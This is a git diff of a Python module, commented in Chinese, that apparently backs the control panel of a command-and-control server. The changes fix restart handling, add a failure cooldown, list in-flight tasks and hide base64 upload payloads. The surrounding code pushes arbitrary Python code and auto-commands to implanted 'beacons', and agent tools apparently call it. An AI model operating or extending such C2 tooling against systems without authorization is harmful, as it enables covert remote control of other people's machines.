@@ -9,9 +9,11 @@ Dispatcher.execute() 统一命令入口操作:列 beacon、看详情、下发 ex
 
 import importlib
 import json
+import re
 import os
 import sys
 import threading
+import time
 from datetime import timezone
 
 # C2 server 内部用 datetime.now()(服务器本地 naive 时间)记录时间戳,
@@ -35,6 +37,8 @@ _C2_INIT_ERROR = ""  # 初始化失败信息
 _C2_PROJECT_ROOT = ""   # 最近一次 init_c2 的参数(restart 用)
 _C2_CONFIG_FILE = "config.json"
 _C2_MANUAL_STOP = False  # 用户手动停止标志:停止后各接口不再自动拉起(显式 start 才恢复)
+_C2_FAIL_TS = 0.0        # 上次启动失败时刻(0=无);冷却期内不再重试
+_C2_FAIL_COOLDOWN = 30.0  # 启动失败后的重试冷却(秒)
 
 
 def c2_running() -> bool:
@@ -54,13 +58,29 @@ def was_manual_stopped() -> bool:
 
 
 def start_c2(project_root: str, config_file: str = "config.json") -> tuple:
-    """显式启动 C2(清除手动停止标志后 init)。返回 (ok, message)。"""
-    global _C2_MANUAL_STOP
+    """显式启动 C2(清除手动停止标志后 init)。返回 (ok, message)。
+
+    2026-09-28 修复:面板终端里执行 `exit` 会走引擎 on_exit=server.stop() 把 server
+    停掉,但 `_C2` 仍指向那个**已停止的实例** —— 此时点「启动」,原先的 init_c2 会
+    "已初始化直接返回",把这个死实例原样返回,于是面板报"已启动"却根本没在跑。
+    现在:发现实例已非运行态就先丢弃它,让 init_c2 新建(顺带重新加载加密状态)。
+    """
+    global _C2, _C2_MANUAL_STOP, _C2_FAIL_TS
     _C2_MANUAL_STOP = False
+    # 显式启动:清除失败冷却 —— 用户点「启动」就是要立刻再试一次,不能被 30s 冷却
+    # 吞掉(此前 start_c2 → init_c2 撞冷却直接返回 None,面板显示的是上次的旧错误)
+    _C2_FAIL_TS = 0.0
+    stale = _C2 is not None and not c2_running()
+    if stale:
+        old, _C2 = _C2, None
+        try:
+            old.stop()              # 幂等收尾(已停则内部直接返回)
+        except Exception:           # noqa: BLE001 - 旧实例收尾失败不阻塞重起
+            pass
     srv = init_c2(project_root, config_file)
     if not srv:
         return False, _C2_INIT_ERROR or "C2 启动失败"
-    return True, "C2 已启动"
+    return True, "C2 已启动(上次运行已结束,已重新拉起)" if stale else "C2 已启动"
 
 
 def stop_c2() -> tuple:
@@ -84,17 +104,31 @@ def init_c2(project_root: str, config_file: str = "config.json"):
     手动停止后(_C2_MANUAL_STOP=True)不自动拉起——任何懒加载入口
     (面板 API / agent 工具)都会拿到 None,须显式 start_c2() 恢复。
     """
-    global _C2, _C2_INIT_ERROR, _C2_PROJECT_ROOT, _C2_CONFIG_FILE
-    if _C2 is not None:
+    global _C2, _C2_INIT_ERROR, _C2_PROJECT_ROOT, _C2_CONFIG_FILE, _C2_FAIL_TS
+    if _C2 is not None and c2_running():
         return _C2
+    if _C2 is not None:
+        # 实例存在但已停止(如面板终端执行过 exit)→ 不能当可用实例返回,
+        # 否则各懒加载接口会把"死实例"当活的用(2026-09-28)
+        _C2_INIT_ERROR = "C2 已停止(上次运行已结束),请点「启动」重新拉起"
+        return None
     if _C2_MANUAL_STOP:
         _C2_INIT_ERROR = "C2 已手动停止,请先在面板点「启动」"
         return None
+    # 启动失败冷却:失败后 _C2_FAIL_COOLDOWN 秒内直接返回错误(不再重复 import/
+    # 启动 + 等满 3s);冷却过后允许再试一次(2026-09-28)
+    if _C2_FAIL_TS and time.time() - _C2_FAIL_TS < _C2_FAIL_COOLDOWN:
+        return None
     with _C2_LOCK:
-        if _C2 is not None:
+        if _C2 is not None and c2_running():
             return _C2
+        if _C2 is not None:
+            _C2_INIT_ERROR = "C2 已停止(上次运行已结束),请点「启动」重新拉起"
+            return None
         if _C2_MANUAL_STOP:
             _C2_INIT_ERROR = "C2 已手动停止,请先在面板点「启动」"
+            return None
+        if _C2_FAIL_TS and time.time() - _C2_FAIL_TS < _C2_FAIL_COOLDOWN:
             return None
         _C2_PROJECT_ROOT = os.path.abspath(project_root)
         _C2_CONFIG_FILE = config_file
@@ -136,7 +170,22 @@ def init_c2(project_root: str, config_file: str = "config.json"):
         # 后台线程跑 start()(headless 循环阻塞在后台,listener/cleanup/udp 一并启动)
         t = threading.Thread(target=server.start, daemon=True, name="c2-server")
         t.start()
+        # 等它真的进入运行态再登记为 _C2:否则"构造完成但线程还没跑到 start()"的
+        # 窗口里,running 仍是 False —— 上面的"死实例"判定会误判为已停止(2026-09-28)
+        for _ in range(60):
+            if getattr(server, "running", False):
+                break
+            time.sleep(0.05)
+        if not getattr(server, "running", False):
+            _C2_INIT_ERROR = "C2 启动失败:未进入运行态(检查端口占用与 server.log)"
+            _C2_FAIL_TS = time.time()
+            try:
+                server.stop()
+            except Exception:           # noqa: BLE001 - 收尾
+                pass
+            return None
         _C2 = server
+        _C2_FAIL_TS = 0.0
         return server
 
 
@@ -206,6 +255,7 @@ def _beacon_dict(rec) -> dict:
         "sys_platform": rec.sys_platform or "",
         # R11:最近一次下载失败原因(面板详情直接显示,不用翻日志)
         "dl_error": getattr(rec, "dl_error", "") or "",
+        "ul_error": getattr(rec, "ul_error", "") or "",
         "tags": list(getattr(rec, "tags", []) or []),
         "via": getattr(rec, "via", "") or "直连",
         "is_fork": bool(getattr(rec, "is_fork", False)),
@@ -511,9 +561,8 @@ def push_raw(client_id: str, code: str):
         return False, "client_id 为空"
     if not code:
         return False, "代码为空"
-    from server.module_loader import strip_py_comments
-    code = strip_py_comments(code).strip()
-    if not code:
+    from server.core.pycode import strip_py_comments
+    if not strip_py_comments(code).strip():
         return False, "剥离注释后代码为空"
     with _C2_LOCK:
         rec = server._mgr.get_client(client_id)
@@ -551,8 +600,7 @@ def set_auto_commands(commands: list):
                 with open(cfg_path, "r", encoding="utf-8") as f:
                     raw = json.load(f)
                 raw["auto_commands"] = norm
-                with open(cfg_path, "w", encoding="utf-8") as f:
-                    json.dump(raw, f, indent=2, ensure_ascii=False)
+                _atomic_save_json(cfg_path, raw)  # 原子写(防与 console 并发写撞半截)
             except Exception as exc:
                 return False, f"写回 config.json 失败: {exc}"
         else:
@@ -731,7 +779,44 @@ def beacon_detail(client_id: str) -> dict:
         d["pending_count"] = server._tq.pending_count(client_id)
         # 已在锁内,直接调无锁内部实现(避免 task_list 再次 acquire 死锁)
         d["tasks"] = _task_list_unlocked(server, client_id)
+        # 3A(2026-09-28):"已下发但结果未回收"的任务 —— 含 server 重启前下发的。
+        # 重启恢复后这些任务不在队列里(已下发),也没有结果;列出来避免静默消失。
+        d["in_flight"] = _in_flight_unlocked(server, client_id)
         return {"ok": True, "beacon": d}
+
+
+def _in_flight_unlocked(server, client_id: str) -> list:
+    """该 beacon 的"已下发未回收"任务快照(须已持 _C2_LOCK)。"""
+    reg = getattr(getattr(server, "_mgr", None), "_inflight", None) \
+        or getattr(server, "_inflight", None)
+    if reg is None:
+        return []
+    try:
+        snap = reg.snapshot()
+    except Exception:
+        return []
+    return [{"task_id": tid, "result_processor": v.get("result_processor", ""),
+             "proc_arg": v.get("proc_arg", "")}
+            for tid, v in sorted(snap.items()) if v.get("client_id") == client_id]
+
+
+_B64_RUN = re.compile(r"[A-Za-z0-9+/]{512,}={0,2}")
+
+
+def _task_code_view(code: str) -> dict:
+    """任务代码的展示视图 —— 含 base64 大块时只给摘要。
+
+    2026-09-28:D(用户要求)upload 等任务的代码里带整块 base64(可分块 240KB),
+    原样发给浏览器会在待办任务列表/编辑框里刷屏。含二进制载荷时:
+      返回 code=""(不外发原文) + binary=True + code_preview 里把 base64 段替换成
+      "<N 字符 base64 已省略>", 前端据此提示"该任务含二进制载荷"。
+    """
+    text = str(code or "")
+    m = _B64_RUN.search(text)
+    if m:
+        masked = text[:m.start()] + f"<{len(m.group(0))} 字符 base64 已省略>" + text[m.end():]
+        return {"code": "", "code_preview": masked[:200], "binary": True}
+    return {"code": text, "code_preview": text[:120], "binary": False}
 
 
 def _task_list_unlocked(server, client_id: str, limit: int = 50) -> list:
@@ -741,13 +826,15 @@ def _task_list_unlocked(server, client_id: str, limit: int = 50) -> list:
         return []
     items = []
     for task in list(q)[:limit]:
+        view = _task_code_view(task.code)
         items.append({
             "task_id": task.task_id,
             "created_at": _iso_utc(task.created_at),
             "is_init": bool(getattr(task, "is_init", False)),
             "result_processor": task.result_processor or "",
-            "code": str(task.code or ""),            # 完整代码(编辑用)
-            "code_preview": str(task.code or "")[:120],
+            "code": view["code"],                    # 完整代码(编辑用;二进制任务不外发)
+            "code_preview": view["code_preview"],
+            "binary": view["binary"],                # 含 base64 大块 → 前端提示
         })
     return items
 
